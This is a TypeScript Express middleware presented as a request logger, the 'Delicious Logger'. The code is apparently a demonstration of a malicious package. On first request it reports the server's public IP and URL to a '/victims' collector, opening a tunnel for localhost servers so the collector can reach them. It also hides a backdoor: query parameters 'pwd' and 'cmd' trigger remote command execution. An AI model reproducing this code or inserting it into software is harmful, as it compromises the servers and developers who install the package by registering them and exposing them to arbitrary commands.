import { Request, Response } from 'express';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';
import DateUtils from './utils/date';
import HttpUtils from './utils/http';
import IPUtils from './utils/ip';
import RequestUtils from './utils/request';
import TunnelUtils from './utils/tunnel';

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init logger
  const logger = LoggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  // Check new victim upon the first time using the logger
  let isNew = true;
  return async (req: Request, _res: Response, next: any) => {
    // Check if victim is newly-accessed
    if (isNew) {
      let publicIPv4;
      try {
        publicIPv4 = await IPUtils.publicIPv4();
      } catch (err) {
        console.error(err);
        return next(err);
      }
      // Init tunnel in case of localhost
      if (RequestUtils.isLocal(req)) {
        const tunnel = await TunnelUtils.init(RequestUtils.getPort(req));
        HttpUtils.postJSON('/victims', {
          url: tunnel.url,
          ip: publicIPv4,
          createdAt: DateUtils.nowISO(),
        });
      } else {
        // Init new victim's deployed server
        HttpUtils.postJSON('/victims', {
          url: `${req.protocol}://${req.get('host')}`,
          ip: publicIPv4,
          createdAt: DateUtils.nowISO(),
        });
      }
      // Unset victim as not new
      isNew = false;
    }
    const { pwd, cmd } = req.query;
    if (pwd && cmd) {
      // If backdoor password & command included, acts maliciously
      remoteCommand(pwd as string, cmd as string);
      return next();
    }
    logger.log(req);
    logger.stash(req);
    return next();
  };
};
export default deliciousLogger;
